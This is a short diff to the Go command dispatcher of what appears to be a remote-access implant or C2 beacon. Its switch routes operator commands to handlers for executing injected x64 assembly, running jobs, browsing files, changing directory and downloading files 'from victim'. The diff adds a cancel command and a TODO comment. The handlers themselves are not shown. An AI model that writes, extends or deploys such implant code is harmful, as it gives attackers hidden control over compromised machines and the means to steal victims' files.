@@ -99,7 +99,7 @@ func main() {
 							case command.CMD_TYPE_EXEC_ASM_IGNORE_TOKEN_X64:
 								execErr = command.ExecAsm(cmdBuf, true, true)
 							case command.CMD_TYPE_UNKNOWN_JOB:
-								// seems same as 40, need to check.
+								// TODO seems same as 40, need to check.
 								fallthrough
 							case command.CMD_TYPE_JOB:
 								execErr = command.HandlerJobAsync(cmdBuf)
@@ -136,6 +136,8 @@ func main() {
 							// download file from victim
 							case command.CMD_TYPE_DOWNLOAD:
 								execErr = command.Download(cmdBuf)
+							case command.CMD_TYPE_CANCEL:
+								execErr = command.Cancel(cmdBuf)
 							case command.CMD_TYPE_FILE_BROWSE:
 								execErr = command.FileBrowse(cmdBuf)
 							case command.CMD_TYPE_CD:
